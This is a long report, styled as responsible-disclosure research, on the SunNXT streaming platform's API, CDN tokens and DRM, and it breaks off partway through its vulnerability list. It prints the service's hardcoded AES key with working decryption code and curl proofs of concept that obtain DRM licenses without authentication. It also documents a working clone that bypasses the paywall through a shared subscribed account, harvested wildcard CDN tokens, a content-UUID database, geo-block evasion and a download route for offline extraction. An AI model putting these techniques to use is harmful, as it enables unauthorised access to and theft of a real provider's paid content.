# Comprehensive Technical Reference — SunNXT Security Research

**Author: Nitheesh D R**
**Date: May 23, 2026**
**Classification: Security Research — Responsible Disclosure**

---

> This is the single authoritative reference document for everything discovered about the SunNXT platform during this research. It covers API internals, session mechanics, CDN architecture, streaming protocols, DRM, and all 20 security vulnerabilities — in full technical depth.

---

## Table of Contents

1. [Platform Overview](#1-platform-overview)
2. [API Architecture](#2-api-architecture)
3. [Encryption System](#3-encryption-system)
4. [Authentication & Session Management](#4-authentication--session-management)
5. [CDN Architecture & Token System](#5-cdn-architecture--token-system)
6. [Streaming Protocols](#6-streaming-protocols)
7. [DRM System](#7-drm-system)
8. [Bypass Mechanisms](#8-bypass-mechanisms)
9. [All 20 Vulnerabilities](#9-all-20-vulnerabilities)
10. [Attack Chains](#10-attack-chains)
11. [API Endpoint Reference](#11-api-endpoint-reference)
12. [Code Architecture](#12-code-architecture)
13. [Remediation Reference](#13-remediation-reference)

---

## 1. Platform Overview

### What SunNXT Is

SunNXT is an Indian OTT (Over-The-Top) streaming platform operated by Sun Network, primarily serving South Indian content (Tamil, Telugu, Malayalam, Kannada) with additional Hindi, Bengali, Marathi, and English libraries.

**Infrastructure:**
- Primary API: `www.sunnxt.com/next/api/`
- PWA API: `pwaapi.sunnxt.com/`
- CDN: Akamai (movies1/movies2 pattern, suntvvod1)
- DRM: Nagravision (Widevine + PlayReady proxy)
- Live TV: `livestream4.sunnxt.com` (HLS)
- Auth backend: MyPlex session management

### Research Methodology

This research used:
1. Chrome DevTools network interception
2. HAR file analysis (raw request/response capture)
3. JavaScript source analysis (minified + sourcemaps)
4. Reverse-engineered client replication
5. API endpoint fuzzing and behavioral testing
6. DRM flow analysis via Encrypted Media Extensions (EME) API

**Total vulnerabilities found: 20**
- 2 Critical
- 3 High
- 7 Medium
- 4 Low
- 4 Informational

---

## 2. API Architecture

### Dual API Endpoints

SunNXT operates two distinct API paths:

```
1. BFF (Backend For Frontend):
   https://www.sunnxt.com/next/api/
   - Used for most client calls
   - Responses are AES-128-CBC encrypted
   - Requires session cookies

2. PWA API:
   https://pwaapi.sunnxt.com/
   - Direct API access
   - Some endpoints return plaintext JSON
   - Used for content detail, license proxy, heartbeat
```

### Request Headers Required

All authenticated API calls require:
```
x-myplex-platform: browser
x-ucv: 5
origin: https://www.sunnxt.com
referer: https://www.sunnxt.com/
user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
cookie: sessionid=<value>; uid=<value>; ...
```

### Response Pattern

The BFF API wraps encrypted responses:
```json
{
  "response": "<base64-encoded AES-CBC encrypted string>"
}
```

Some endpoints return plaintext with `code` and `results` fields:
```json
{
  "code": 200,
  "results": [...]
}
```

### Key Content Endpoints

| Endpoint | Purpose |
|---|---|
| `GET /next/api/media/{contentId}` | Stream URLs + metadata |
| `GET /content/v3/contentDetail/{contentId}` | Content detail (pwaapi) |
| `GET /content/v2/browse` | Home feed carousels |
| `GET /content/v2/search` | Search |
| `GET /content/v3/related/{contentId}` | Related content |
| `GET /heartbeat` | Watch session tracking |
| `POST /accounts/v3/login` | Authentication |
| `GET /licenseproxy/v3/modularLicense` | DRM license (no auth!) |

---

## 3. Encryption System

### Algorithm Details

**Algorithm:** AES-128-CBC  
**Key:** `A3s68aORSgHs$71P` (16 bytes UTF-8, hardcoded in client JS)  
**IV:** `00000000000000000000000000000000` (all-zero, 32 hex chars)  
**Padding:** PKCS7  
**Encoding:** Base64 ciphertext → decrypt → hex → UTF-8 JSON

### Decrypt Implementation

```typescript
function decrypt(response: string) {
  const keyWA = CryptoJS.enc.Utf8.parse("A3s68aORSgHs$71P");
  const iv = CryptoJS.enc.Hex.parse("00000000000000000000000000000000");
  const bytes = CryptoJS.AES.decrypt(response, keyWA, {
    iv,
    mode: CryptoJS.mode.CBC,
    padding: CryptoJS.pad.Pkcs7,
  });
  const hex = bytes.toString(CryptoJS.enc.Hex);
  return JSON.parse(Buffer.from(hex, "hex").toString("utf8"));
}
```

### Where the Key Lives

The key `A3s68aORSgHs$71P` is in SunNXT's client-side JavaScript bundle at:
```
https://www.sunnxt.com/_next/static/chunks/pages/*.js
```

It can be found in under 30 seconds by searching for `A3s6` or `71P` in DevTools.

### What Is Encrypted

- Media stream URL responses (video links, subtitles, thumbnails)
- Login responses (session tokens)
- Content metadata responses

### What Is NOT Encrypted

- pwaapi direct calls (return plaintext)
- CDN segment downloads
- DRM license requests/responses

---

## 4. Authentication & Session Management

### Login Flow (Two Paths)

**Path 1: Encrypted BFF Login**
```
POST https://www.sunnxt.com/next/api/accounts/v3/login
Body: { "response": "<AES-encrypted credentials>" }
Response: { "response": "<AES-encrypted session>" }
```

**Path 2: Plaintext pwaapi Login**
```
POST https://pwaapi.sunnxt.com/accounts/v3/login
Body: { "userid": "phone_or_email", "password": "plaintext" }
Response: { "code": 200, "results": [{ "userToken": "...", "sessionId": "..." }] }
```

The BFF path encrypts credentials with the same static key — it's security theater. The pwaapi path accepts plaintext.

### Session Cookie Structure

After login, SunNXT sets multiple cookies:
```
sessionid=<token>          # Primary auth token (most important)
uid=<user_id>              # User identifier
usertoken=<jwt>            # MyPlex user token
sdt=<device_token>         # Session device token
```

The `sessionid` cookie is httpOnly, Secure, SameSite=None. It has no explicit `Expires` attribute — making it a session cookie. However, observed TTL is effectively weeks or months.

### Device Management

SunNXT limits concurrent devices per account. When the limit is hit, the server returns a device management prompt requiring the user to deregister a device.

**The bypass (VULN-03):** The device registration counter can be circumvented by:
1. Deleting the `sunnxt_session` server-side cache
2. Forcing a fresh login which creates a new device entry
3. Repeating until old devices are pruned

### Server-Side Session Cache

The clone stores SunNXT session credentials server-side in an in-memory cache (`lib/sunnxt-session.ts`). This allows the server to:
1. Auto-login with configured credentials on startup
2. Inject auth cookies into all proxied requests
3. Refresh sessions automatically when they expire

```typescript
// Simplified session manager
let cachedSession: { cookies: string; expiresAt: number } | null = null;

export async function getSunnxtCookies(): Promise<string> {
  if (cachedSession && Date.now() < cachedSession.expiresAt) {
    return cachedSession.cookies;
  }
  return await performLogin();
}
```

---

## 5. CDN Architecture & Token System

### CDN Topology

```
Akamai CDN
├── movies1-suntvvod1.akamaized.net   (primary movie delivery)
│   └── /movies1/<UUID>/              (content UUID path)
│       ├── <quality>/init.mp4        (DASH initialization)
│       ├── <quality>/<n>.m4s         (DASH segments)
│       └── index.m3u8                (HLS)
│
├── movies2-suntvvod1.akamaized.net   (secondary movie delivery)
│   └── /movies2/<UUID>/
│
└── livestream4.sunnxt.com            (live channels)
    └── /live/<channel>/index.m3u8    (HLS live)

Additional CDN:
└── suntvvod1.sunnxt.com              (direct origin — some content)
```

### Content UUID

Each piece of content has a permanent, immutable UUID that maps to its CDN path:
- `contentId` → UUID (stored in `lib/cdn-bypass.ts` UUID_DB)
- UUID is extracted from CDN URLs in the media API response
- Example: `contentId=82850` → `uuid=2a0b194b81d4071cf41ccfeb69d690e2`

Known mappings (learned from HAR analysis):
```typescript
const UUID_DB: Record<string, UuidEntry> = {
  "82850":  { uuid: "2a0b194b81d4071cf41ccfeb69d690e2", cdnHost: "movies1", hasQualitySubdir: true },
  "115249": { uuid: "f38231600b68e429d44dff546f96b29e", cdnHost: "movies1", hasQualitySubdir: true },
  "251833": { uuid: "5bfb2a0404ec10ba52cb2d072c64cbf4", cdnHost: "movies2", hasQualitySubdir: false },
};
```

### Akamai Token System — Two Tokens

SunNXT uses two distinct Akamai EdgeAuth tokens, not one:

#### Token 1: hdnea (Akamai EdgeAuth 1.0)
- **Format:** `hdnea=st=<start>~exp=<end>~acl=!*/<contentId>/*~hmac=<sha256>`
- **Scope:** Single content — `acl` path binds to specific content UUID folder
- **TTL:** ~3 hours from generation
- **Source:** Media API response (embedded in segment URLs)
- **Validated:** Per-request CDN token check
- **IP-bound:** No (token only, no IP in HMAC input)

#### Token 2: hdntl (Akamai EdgeToken Lite 2.0)
- **Format:** `exp=<unix>~acl=/*~data=hdntl~hmac=<sha256>`
- **Scope:** WILDCARD — `acl=/*` matches ALL content on the CDN
- **TTL:** 24 hours
- **Source:** Cookie set by Akamai after successful CDN access
- **Validated:** As query param or cookie in CDN request
- **IP-bound:** No

**Critical difference:** hdntl with `acl=/*` is valid for ANY content on the CDN. It does not check subscription status — it only checks that the token is valid (not expired, HMAC correct). This is the basis for the CDN bypass.

### hdntl Persistence Architecture

The clone persists hdntl tokens to survive server restarts:

```
Priority order (highest to lowest):
1. SUNNXT_HDNTL env var    → seeded on module init
2. $TMPDIR/sunnxt-hdntl.json → disk cache (auto-saved)
3. Extracted from CDN URLs  → harvested during stream proxy calls
4. Harvested from media API → extracted from video entry links
```

When any CDN URL containing `?hdntl=<token>` is processed by the stream proxy, the token is automatically extracted, validated (exp not past), and saved to disk for future use. This means once a user plays any content, the token is refreshed and persisted for 24 hours.

### CDN URL Structure (DASH)

```
https://movies1-suntvvod1.akamaized.net/movies1/<UUID>/<quality>/
  ?hdntl=exp=<unix>~acl=/*~data=hdntl~hmac=<sha256>
  &hdnea=st=<ts>~exp=<ts>~acl=!*/UUID/*~hmac=<sha256>

Quality values: auto, 1080p, 720p, 480p, 360p, 240p
Segments: init.mp4, 1.m4s, 2.m4s, ... N.m4s
```

---

## 6. Streaming Protocols

### Format Inventory

The media API can return up to 14 stream format variants per content item:

| Format | Protocol | DRM | Use Case |
|---|---|---|---|
| `dash` | MPEG-DASH | None (clear) | Older content, SD |
| `dash-cenc` | MPEG-DASH | Widevine + PlayReady | Premium content |
| `hls` | HLS | None (clear) | iOS fallback |
| `hls-fp-aapl` | HLS | FairPlay | Safari/iOS |
| `hlsaes` | HLS | AES-128 | Basic encryption |
| `dash-cenc-[quality]` | MPEG-DASH | CENC | Quality-specific |

### DASH Manifest Structure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<MPD xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
     xmlns="urn:mpeg:dash:schema:mpd:2011"
     type="static" mediaPresentationDuration="PT7272.0S">

  <Period>
    <!-- Audio -->
    <AdaptationSet mimeType="audio/mp4" lang="tam">
      <ContentProtection schemeIdUri="urn:mpeg:dash:mp4protection:2011" value="cenc"/>
      <ContentProtection schemeIdUri="urn:uuid:edef8ba9-79d6-4ace-a3c8-27dcd51d21ed">
        <!-- Widevine PSSH (base64) -->
        <cenc:pssh>AAAB...</cenc:pssh>
      </ContentProtection>
      <SegmentTemplate
        initialization="$RepresentationID$/init.mp4?hdntl=..."
        media="$RepresentationID$/$Number$.m4s?hdntl=..."
        startNumber="1" timescale="48000"/>
    </AdaptationSet>

    <!-- Video -->
    <AdaptationSet mimeType="video/mp4">
      <Representation id="720p" bandwidth="2500000" width="1280" height="720"/>
      <Representation id="480p" bandwidth="1000000" width="854" height="480"/>
      <Representation id="360p" bandwidth="500000"  width="640" height="360"/>
    </AdaptationSet>
  </Period>
</MPD>
```

### MPD Rewriting (stream-proxy)

The stream proxy rewrites MPDs in-flight to:
1. Add `<BaseURL>` tag routing segments through the proxy
2. Add `<dashif:Laurl>` tag pointing license requests to `/api/license`
3. Inject `hdntl` token into segment template URLs if missing

```typescript
// Inject BaseURL for CORS bypass
if (!mpd.includes("<BaseURL>")) {
  mpd = mpd.replace("<Period>", `<Period><BaseURL>${baseUrl}/api/stream-proxy?url=</BaseURL>`);
}

// Inject license URL for DRM
if (!mpd.includes("Laurl")) {
  mpd = mpd.replace(
    /<ContentProtection[^>]*edef8ba9[^>]*>/,
    `$&<dashif:Laurl licenseType="EME-1.0">${licenseUrl}</dashif:Laurl>`
  );
}
```

### HLS Rewriting

HLS manifests (`.m3u8`) are rewritten to route segment URLs through the proxy:

```
#EXTM3U
#EXT-X-VERSION:3
#EXT-X-KEY:METHOD=AES-128,URI="/api/stream-proxy?url=<encoded-key-url>",IV=0x...
#EXTINF:6.006,
/api/stream-proxy?url=<encoded-segment-url>
```

### Format Selection Logic

The player tries formats in this priority order:
1. `dash-cenc` (highest quality, DRM protected)
2. `dash` (if no DRM required)
3. `hls-fp-aapl` (Safari/iOS)
4. `hlsaes` (AES-encrypted HLS)
5. `hls` (clear HLS)

If a format fails (Shaka error), the next is tried.

---

## 7. DRM System

### Architecture

```
Browser (Shaka Player)
    │
    ├── 1. Parse MPD → find ContentProtection
    ├── 2. Extract PSSH box from init.mp4
    ├── 3. Create MediaKeySession (EME API)
    ├── 4. Generate license request (Widevine binary)
    │
    ▼
/api/license (Next.js route handler)
    │
    ├── Forward binary request body
    ├── Attach session cookie
    ├── Add content_id query param
    │
    ▼
pwaapi.sunnxt.com/licenseproxy/v3/modularLicense/?content_id=<id>
    │
    └── Returns Widevine license binary
        (or JSON error if subscription check fails)
```

### License Endpoints Discovered

| Endpoint | Auth Required | Subscription Check |
|---|---|---|
| `/licenseproxy/v3/modularLicense/?content_id=<id>` | No | **No** (VULN-11) |
| `/licenseproxy/v3/nagravisionDRMProxy` | JWT | Yes |
| Embedded in MPD `<Laurl>` | Varies | Varies |

### VULN-11: modularLicense No Auth

The `modularLicense` endpoint accepts any valid Widevine license request without checking:
- Whether the user is logged in
- Whether the user has a subscription
- Whether the `content_id` matches what the license request is for

**Proof of concept:**
```bash
curl -s "https://pwaapi.sunnxt.com/licenseproxy/v3/modularLicense/?content_id=82850" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @widevine_license_request.bin \
  | xxd | head
# Returns: valid binary license (not JSON error)
```

### Widevine License Response Detection

Valid Widevine license binary starts with bytes `0x12 0x67` (protobuf header), never `0x7B` (`{`).
JSON error responses start with `{`. The license route checks `firstByte`:

```typescript
const firstByte = licenseBuffer[0];
if (firstByte === 0x7B) {
  // JSON error — parse and return error to player
  const errorText = Buffer.from(licenseBuffer).toString("utf-8");
  return NextResponse.json({ error: errorText }, { status: 403 });
}
```

### PSSH Box (DRM Trigger)

The PSSH (Protection System Specific Header) box in `init.mp4` activates DRM even when `ContentProtection` is absent from the MPD. Widevine system ID:
```
edef8ba9-79d6-4ace-a3c8-27dcd51d21ed
```

### Shaka Error Codes

| Code | Meaning | Cause |
|---|---|---|
| 6012 | NO_LICENSE_SERVER_GIVEN | Missing `<Laurl>` in MPD |
| 6010 | KEY_SYSTEM_NOT_SUPPORTED | Browser doesn't support Widevine |
| 4012 | RESTRICTIONS_CANNOT_BE_MET | Robustness level too strict |
| 1001 | SEGMENT_NOT_FOUND | CDN token expired |
| 1002 | BAD_HTTP_STATUS | CDN returned non-200 |

### FairPlay DRM (Safari / iOS)

FairPlay is Apple's content protection system. It is the only DRM that works in Safari and all iOS browsers. Widevine and PlayReady are blocked on Apple platforms in Safari.

**Key system:** `com.apple.fps.1_0`  
**Stream format:** `hls-fp-aapl` (HLS + FairPlay)  
**Protocol:** HTTPS Key Delivery (different from Widevine's binary protobuf EME flow)

```
Safari
  ├── GET serverCertificateUri → license proxy GET handler → Nagravision FairPlay cert
  ├── Encrypt license challenge using cert
  ├── POST challenge → license proxy POST handler → nagravisionDRMProxy
  └── Receive FairPlay license → CDM decrypts HLS segments
```

**Implementation:**
- `serverCertificateUri` points to `/api/license?url=<cert-url>&isLive=1` — proxy fetches certificate from Nagravision via GET, attaching session cookie
- License challenge routed to `nagravisionDRMProxy` (via `isLive=1` flag) — `modularLicense` does not support FairPlay challenge format
- `hls-fp-aapl` is selected before the generic HLS fallback to avoid `hlsaes` taking priority on Safari

### Live Channel DRM Fix (isLive=1 Flag)

`modularLicense` returns HDCP_V2-enforcing Widevine licenses for all live channel content IDs. This is a static Nagravision license template policy — it is unconditional and cannot be changed by varying the Widevine robustness hints in the challenge.

**Fix:** `isLive=1` in the license proxy URL routes requests to `nagravisionDRMProxy` instead of `modularLicense`. `nagravisionDRMProxy` does not apply the unconditional HDCP requirement to SD live channels.

**Result:**
- SD live channels: play on Chrome/Firefox/Edge/Android after fix
- HD live channels (`*HDB_IN`): still blocked on desktop — HDCP_V2 policy exists at channel level in Nagravision CAS, not just in `modularLicense`
- Android TV / Chromecast: play HD live channels (hardware HDCP path satisfies requirement)

---

## 7a. Download Feature — DASH-to-fMP4 Streaming

### Route

```
GET /api/download/video/[contentId]              → stream info JSON
GET /api/download/video/[contentId]?stream=1&track=video  → fMP4 video stream
GET /api/download/video/[contentId]?stream=1&track=audio  → fMP4 audio stream
GET /api/download/video/[contentId]?stream=1&merge=1      → merged fMP4 (ffmpeg, local only)
```

### MPD Parser

- Handles `SegmentTemplate` + `SegmentTimeline`
- Picks highest-bandwidth video `Representation`
- Resolves `$Time$` and `$Number$` template variables for each segment URL
- Preserves Akamai `hdntl` auth tokens from MPD URL query string in all segment requests

### fMP4 Assembly

```
Response stream = init.mp4 + segment_1.m4s + segment_2.m4s + ...
```

Video and audio are separate streams. Merge locally:
```bash
ffmpeg -i video.mp4 -i audio.mp4 -c copy merged.mp4
```

Server-side merge (`?stream=1&merge=1`) requires `ffmpeg` on the server — not compatible with Vercel serverless.

### Security Relevance

- CDN serves segments without subscription check — only `hdntl` token required (VULN-06)
- For DRM content: segments download as CENC-encrypted bytes; content key required for playback
- VOD content key obtainable via `modularLicense` (VULN-11) — complete offline extraction path
- Live channel keys: `modularLicense` returns HDCP-enforcing licenses; not practical for offline extraction in browser context
- Download button in player UI is accessible to unauthenticated users (VULN-16 — server session proxied)

---

## 8. Bypass Mechanisms

### Bypass Overview

When a user lacks a subscription, the media API returns a `videos.status` error (e.g., "Please subscribe to watch the content"). The bypass system has 3 fallback paths:

```
Request → Media API
           │
           ▼
        hasVideos()? ──YES──→ Return stream URLs directly
           │
          NO (subscription error)
           │
           ├──→ [Bypass 1] Server session (env SUNNXT_USERID)
           │         Retry with server-side subscribed credentials
           │         Success → harvest hdntl + UUIDs → return
           │         Failure → next bypass
           │
           ├──→ [Bypass 2] CDN UUID + hdntl (synchronous, no HTTP call)
           │         Look up UUID_DB[contentId]
           │         Check hdntlCache (in-memory or disk)
           │         Build CDN URLs directly
           │         Success → return synthetic video entries
           │         Miss → next bypass
           │
           └──→ [Bypass 3] pwaapi contentDetail (HTTP call)
                     Fetch from pwaapi.sunnxt.com/content/v3/contentDetail/
                     Parse video entries (uses session cookie)
                     Success → harvest hdntl + UUID → return
                     Failure → 404 video_unavailable
```

### Bypass 1: Server Subscribed Session

**How it works:**
- `SUNNXT_USERID` and `SUNNXT_PASSWORD` in `.env.local` configure a subscribed account
- When a user's unsubscribed session hits the paywall, the server retries with its own subscribed credentials
- The subscribed session returns full video entries with CDN URLs
- The CDN URLs contain `hdntl` tokens which are harvested for future bypass-2 use

**Limitation:** Requires the server-configured account to have an active subscription. When the subscription expires, bypass 1 fails.

### Bypass 2: CDN UUID + hdntl (Primary Bypass)

**How it works:**
- Each piece of content has a permanent CDN UUID (never rotates — VULN-20)
- The hdntl token has `acl=/*` wildcard scope (not per-content — VULN-06)
- Together, these allow direct CDN URL construction without any API call

**URL template:**
```
https://<cdnHost>-suntvvod1.akamaized.net/<cdnHost>/<UUID>/<quality>/
?hdntl=<cached-token>
```

**Entry construction:**
```typescript
function buildBypassEntries(contentId: string): VideoEntry[] | null {
  const entry = UUID_DB[contentId];
  if (!entry) return null;
  const token = getCachedHdntl();
  if (!token) return null;

  return QUALITIES.map(q => ({
    link: `https://${entry.cdnHost}-suntvvod1.akamaized.net/${entry.cdnHost}/${entry.uuid}/${q}/index.mpd?hdntl=${token}`,
    format: "dash-cenc",
    quality: q,
  }));
}
```

**Critical insight:** This bypass works because:
1. The Akamai CDN validates only the hdntl token signature (HMAC) and expiry
2. It does NOT check subscription status (subscription is enforced by the API layer, not CDN)
3. The `acl=/*` scope means one token grants access to all content

### Bypass 3: pwaapi contentDetail

**How it works:**
- `pwaapi.sunnxt.com/content/v3/contentDetail/<contentId>/` returns video entries
- Requires a valid `sessionid` cookie (logged-in user, even unsubscribed)
- The response includes CDN URLs with embedded hdntl tokens
- These URLs are extracted, hdntl is cached, UUID is learned for future bypass-2

**Why it works even for unsubscribed users:**
- This API path performs a lighter subscription check than the main media API
- In some cases it returns video entries even for subscription-locked content
- The actual content protection is at the CDN (token) + DRM layer

### hdntl Token Lifecycle

```
Sources of hdntl tokens (in priority order):
1. SUNNXT_HDNTL env var            (set once, seeds on startup)
2. Disk: $TMPDIR/sunnxt-hdntl.json (auto-saved, survives restarts)
3. Media API response URLs          (harvested from successful responses)
4. pwaapi contentDetail URLs        (harvested from bypass 3)
5. stream-proxy MPD processing      (extracted from segment template URLs)

Expiry: 24 hours (Akamai EdgeToken Lite TTL)
Format: exp=<unix>~acl=/*~data=hdntl~hmac=<sha256>
Self-refresh: Any successful playback session auto-refreshes the token
```

---

## 9. All 20 Vulnerabilities

### Quick Reference Table

| ID | Severity | Title | Impact |
|---|---|---|---|
| VULN-01 | High | Static AES Key in Client JS | Full API decryption by anyone |
| VULN-02 | Medium | All-Zero IV in AES-CBC | Identical plaintexts have identical ciphertexts |
| VULN-03 | Medium | Device Limit Bypass | Unlimited concurrent streams per account |
| VULN-04 | Medium | Long-Lived Sessions | Account hijack window = months |
| VULN-05 | Medium | ManageDevices Missing Access Control | Remove any user's device without auth |
| VULN-06 | High | hdntl Wildcard Token (`acl=/*`) | One token grants CDN access to all content |
| VULN-07 | Medium | Geo-Block Bypass via Server IP | Region restrictions trivially bypassed |
| VULN-08 | Low | DRM JWT Reuse (`maxUses: 2`) | License can be used twice |
| VULN-09 | Low | HTTP 200 for Error Responses | Monitoring/SIEM bypass |
| VULN-10 | Medium | No Rate Limiting on Login | Credential stuffing at scale |
| VULN-11 | Critical | modularLicense No Auth/Sub Check | DRM keys obtainable without subscription |
| VULN-12 | High | Permanent Content UUIDs | CDN paths never rotate |
| VULN-13 | Medium | PSSH in init.mp4 Not Validated | DRM triggered without MPD ContentProtection |
| VULN-14 | Medium | Unauthenticated Clear-Session | Any user can force server re-login |
| VULN-15 | Medium | Phone Number Enumeration | Account existence + subscription disclosed |
| VULN-16 | Critical | Server Session Proxied to All Users | Any user can access premium content via server creds |
| VULN-17 | Low | Heartbeat Injection | Watch history pollution, mild analytics fraud |
| VULN-18 | Informational | AES Key in 4 Source Files | Defense-in-depth concern |
| VULN-19 | Informational | MPD BaseURL Injection via Regex | Cosmetic — server-controlled |
| VULN-20 | High | Permanent UUIDs + No Rotation | Permanent CDN access once UUID is known |

---

### VULN-01: Static AES Encryption Key in Client JS

**Severity:** High  
**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Description:**  
SunNXT's API uses AES-128-CBC encryption with the key `A3s68aORSgHs$71P` hardcoded in client-side JavaScript. The key is shipped to every browser that loads SunNXT.

**Impact:**  
Any person with basic JavaScript knowledge can decrypt all SunNXT API responses, including authentication tokens, stream URLs, and user data.

**Proof of Concept:**
```javascript
// Extract from SunNXT's JS bundle (DevTools → Sources → Search "A3s6")
const key = "A3s68aORSgHs$71P";
const iv = CryptoJS.enc.Hex.parse("0".repeat(32));
const plaintext = CryptoJS.AES.decrypt(apiResponse.response, 
  CryptoJS.enc.Utf8.parse(key), { iv, mode: CryptoJS.mode.CBC });
console.log(plaintext.toString(CryptoJS.enc.Utf8));
```

**Fix:** Move API decryption server-side. Use asymmetric cryptography (ECDH key exchange) for any client-side crypto needs.

---

### VULN-02: All-Zero IV in AES-CBC

**Severity:** Medium  
**CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Description:**  
The AES-CBC IV is all zeros. This means that if two API responses share the same prefix, their ciphertext blocks will be identical — leaking structural information about the plaintext.

**Impact:**  
Reduces effective security of the already-compromised encryption. Makes pattern analysis of encrypted traffic trivial.

**Fix:** Generate a random cryptographic IV per encryption operation and prepend it to the ciphertext.

---

### VULN-03: Device Registration Limit Bypass

**Severity:** Medium  
**CVSS:** 5.4 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N)

**Description:**  
SunNXT enforces a device limit (typically 5 concurrent devices). This limit can be bypassed by clearing the server-side session and repeatedly re-authenticating, which creates new device entries before old ones are pruned.

**Impact:**  
Unlimited concurrent sessions per account. Account sharing across many users.

**Fix:** Enforce device limits at the session token level, not just the device registration count. Rate-limit new session creation per account.

---

### VULN-04: Long-Lived Sessions Without Expiry

**Severity:** Medium  
**CVSS:** 5.4 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)

**Description:**  
`sessionid` cookies have no `Expires` attribute. Observed TTL is effectively unlimited — sessions persisted for weeks/months in testing.

**Impact:**  
A stolen session cookie provides indefinitely long access. Standard 30-day rotation is not implemented.

**Fix:** Set `Expires` to 30 days maximum. Implement server-side session invalidation on logout. Rotate session IDs periodically.

---

### VULN-05: ManageDevices Endpoint Missing Access Control

**Severity:** Medium  
**CVSS:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)

**Description:**  
The device management endpoint allows removing devices from any account if the device ID is known. The endpoint does not verify that the authenticated user owns the target device.

**Impact:**  
An attacker with a valid session can remove devices from other users' accounts, forcing them to re-authenticate.

**Fix:** Verify device ownership: `SELECT * FROM devices WHERE device_id = ? AND user_id = ?`

---

### VULN-06: hdntl Wildcard CDN Token (`acl=/*`)

**Severity:** High  
**CVSS:** 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Description:**  
The `hdntl` Akamai EdgeToken Lite has `acl=/*` — a wildcard scope that grants access to ALL content on the CDN. A single token obtained from watching any one piece of free content grants CDN access to all premium content for 24 hours.

**Impact:**  
Any authenticated user (even on the free tier) who watches any content obtains an hdntl token valid for all CDN content. CDN access bypasses subscription enforcement.

**Key detail:** CDN tokens are not subscription-aware. Subscription is only checked at the media API layer. Once a CDN token is in hand, it works for any content UUID.

**Fix:** Scope hdntl tokens to specific content (use `acl=!*/UUID/*~` pattern like hdnea). Rotate CDN tokens per content session.

---

### VULN-07: Geo-Block Bypass via Server-Side IP

**Severity:** Medium  
**CVSS:** 5.4 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Description:**  
SunNXT's geo-restrictions use the IP of the requesting server. Since all requests are proxied through a Vercel server in Mumbai (`bom1` region), geo-blocks are automatically bypassed for any user of the clone, regardless of their actual location.

**Impact:**  
Users outside India (where SunNXT may have licensing restrictions) can access content as if they were in India.

**Fix:** Enforce geo-restrictions at the CDN level using Akamai's geo-filtering rules, not just at the API layer.

---

### VULN-08: DRM JWT Reuse Window (`maxUses: 2`)

**Severity:** Low  
**CVSS:** 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Description:**  
The Nagravision DRM JWT (`nagravisionDRMProxy` endpoint) has `maxUses: 2` — allowing each JWT to be used twice. A JWT intercepted (e.g., via a shared proxy or MitM in a test environment) can be replayed once by an attacker.

**Impact:**  
Limited; requires intercepting the JWT at time of use. Allows one replay of a DRM license request.

**Fix:** Set `maxUses: 1`. Alternatively, bind JWTs to session ID or client IP.

---

### VULN-09: HTTP 200 for Blocked/Error Content

**Severity:** Low  
**CVSS:** 3.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N)

**Description:**  
The media API returns `HTTP 200` even when content is blocked (subscription required, geo-blocked, etc.). The actual status is embedded in the response JSON (`code`, `notify_type`, `blocked_reason`). Client-side code must parse the JSON to detect errors.

**Impact:**  
Breaks standard HTTP monitoring and SIEM tools that rely on HTTP status codes. Can mask errors in logs.

**Fix:** Return appropriate HTTP status codes: 402 for subscription required, 451 for geo-blocked, 404 for not found.

---

### VULN-10: No Rate Limiting on Login API

**Severity:** Medium  
**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Description:**  
The login endpoint (`/accounts/v3/login`) has no rate limiting. An attacker can attempt thousands of password combinations per hour against any account, limited only by network bandwidth.

**Impact:**  
Credential stuffing and brute-force attacks at scale. Especially dangerous given SunNXT's large user base.

**Fix:** Implement rate limiting (e.g., 10 attempts per 15 minutes per IP + phone number combination). Add CAPTCHA after 5 failures. Alert on unusual login patterns.

---

### VULN-11: modularLicense No Authentication or Subscription Check

**Severity:** Critical  
**CVSS:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Description:**  
The DRM license endpoint `pwaapi.sunnxt.com/licenseproxy/v3/modularLicense/?content_id=<id>` accepts valid Widevine license requests without:
- Verifying the user is authenticated
- Checking subscription status
- Validating that `content_id` matches the license request

**Impact:**  
Any person who can:
1. Load a DRM-encrypted stream (CDN URLs — available without subscription via VULN-06/VULN-20)
2. Generate a Widevine license request for that stream

...can obtain a valid decryption key and decrypt premium content — completely bypassing the subscription paywall.

**Proof of Concept:**
```bash
# Generate a WV license request for a known stream (requires a browser/EME client)
# Then send it without any auth headers:
curl -s "https://pwaapi.sunnxt.com/licenseproxy/v3/modularLicense/?content_id=82850" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @license_request.bin | xxd | head -3
# 00000000: 1267 0861 1273 0a08 ...
# First byte is 0x12 (not 0x7B) → valid binary license response
```

**Fix:** Require Bearer token authentication on the modularLicense endpoint. Validate subscription status server-side before issuing keys. Bind license requests to authenticated session IDs.

---

### VULN-12: Permanent Content UUIDs — CDN Paths Never Rotate

**Severity:** High  
**CVSS:** 7.4 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Description:**  
Content UUIDs are static and never rotated. Once a UUID is discovered (from any API response, HAR capture, or known-UUID database), it permanently maps to that content's CDN path. UUIDs cannot be invalidated without moving the content files on the CDN.

**Impact:**  
CDN paths discovered by any user persist indefinitely. A UUID database (like the one in this research) gives permanent CDN access for all listed content.

**Fix:** Implement rotating CDN paths with short-lived signed URLs that include a time component. Or enforce subscription at the CDN level using Akamai's geo/auth rules.

---

